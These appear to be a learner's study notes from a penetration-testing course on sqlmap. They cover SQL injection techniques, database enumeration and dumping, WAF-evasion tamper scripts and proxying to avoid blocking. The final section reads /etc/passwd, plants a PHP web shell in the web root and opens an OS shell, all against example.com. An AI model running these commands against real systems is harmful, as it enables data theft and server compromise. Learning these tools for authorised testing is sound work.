SQLmap help menu can be used with `-h` or `-hh` 

The  technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries


Default run of sqlmap:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

SQLMap can be used with cURL requests like this:
```shell-session
Poiint@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

this request can be obtained in the network tab using the developer tools (F12). Once we see a request and want to run it on sqlmap we can copy it as 'cURL'.
If it's a post request, we can use the `--data` flag:
```shell-session
Poiint@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

Otherwise, we can capture HTTP requests with a proxy (ex: burp), copy it as a file, and then launch sqlmap like this:
```shell-session
Poiint@htb[/htb]$ sqlmap -r req.txt
```

If there's a cookie, we can specify it like this:
```shell-session
Poiint@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
or like this:
```shell-session
Poiint@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can also specify other flags:
- `--host`
- `--referer`
- `-A/--user-agent` / `--random-agent` / `--mobile`
- `--method` [GET,POST.PUT...]
- `--batch`: No need for user interaction
- `--t`: Output file
- `-v`: Verbosity (1-6 LV)
- `--parse-errors`: To parse DBMS errors
- `--proxy`: to redirect the whole traffict through a proxy

If we want to inject a specific parameter, we can specify the `*` placeholder.
We can also "tune" our attack specifying a prefix or a suffix with `--prefix` and `--suffix`. 

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

We can also modify the level/risk with the option:
`--level` (1 to 5): this option extends vectors and boundaries used based on succesful rates. (boundaries like ')', ecc...)
`--risk` (1 to 3): this option extends the used vector based on their risk (higher the leve, higher the possibility of DB loss or DoS). If specified also with `-v=3` sqlmap will output the payloads. We can also specify `--code`, (ex "code=200"), `--titles`, `--string`, `--text-only`. These are flags that will be compared for TRUE and FALSE responses.
As said before, we can specify also `--technique` flag (ex: "technique=BEU").
When doing an UNION injection, we can specify the columns number with `--union-cols` or the "dummy" filling values with `--union-char`, finally we can specify the "FROM" table with `--union-from`.

We can also perform database enumeration, here some flag (some of them are self explanatory):
- `--hostname`
- `--current-user`: referred to the one that is executing DB's queries.
- `--current-db`
- `--passwords`: will print hashed password
- `--banner`: database version banner
- `--is-dba`: check if the 'current-user' is database admin

The same can be performed for table enumeration using `--tables` flag. We can specify a DB with `-D`

```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
This will print the tables for database 'testdb'.
After spotting the table name of interest, we can dump its content with the flag  `--dump` and `-T` :

```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

If we want to dump a/some specific columns (some tables could have a lot of columns!) we can specify the  `-C` flag:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

We can also limit the output specifying a range of ordinal number inside the table (starting from 1) like this:

```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
This will only output the second and third value in the table.

We can also retrieve rows based on a 'WHERE' condition with `--where` option:

```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

We can finally specify to dump all the DB using the `--dump-all` and is adviced to include the switch `--exclude-sysdbs` since system databases don't contain usually interesting info for pentesters.

We can enumerate schemas with the `--schema` option:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

<SNIP>
```

We can dump hashed password with `--passwords` option.

In case there's some web application protections we can specify these commands:
- `--csrf-token`: we need to specify the name of the token, for example:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
- `--randomize`: in case there's a parameter that is put in place to stop automated tools, we can specify this flag to randomize that parameter, for example:
 ```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```
- `--eval`: in case another parameter is put in place and is calculated based on another parameter (for example 'id'), we can use this option like this:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
- `--proxy`: we can set a proxy in case our IP are being blacklisted, here an example with TOR:
 `--proxy="socks4://177.39.187.70:33283"`
 - `--skip-waf`: can be used to skip web application firewalls, because sqlmap will automatically try to enumerate WAFs.
- `-A/--user-agent` / `--random-agent` / `--mobile`
- `--tamper`: this option is really important, because it permits us to modify the payload sent to the web server. Here a list of tampers:

|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

- `--chunked`: this will split POSt request's body into so-called "chunks", which could pass unnoticed.

Finally, SQLMap permits to do OS enumeration like this:
- `--is-dba`: check is current user is db admin
- `--file-read`: in case we are admin, we probably have the privileges to read file like this:
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
- `--file-write`: if `--secure-file-priv` is not configured correctly, we could have the possibility to write into any directory in the OS. We can create a simple web shell like this:
```shell-session
Poiint@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
and then run this command
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

SQLMap has the possibility to automate this process by using the `--os-shell` option:

```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
```

there could be a problem: with some type of techniques it's not possible to get OS's command outputs. To solve this problem, we can change our injection technique and try again
```shell-session
Poiint@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
The `Error-based SQL Injection` has a better chance of giving us direct output.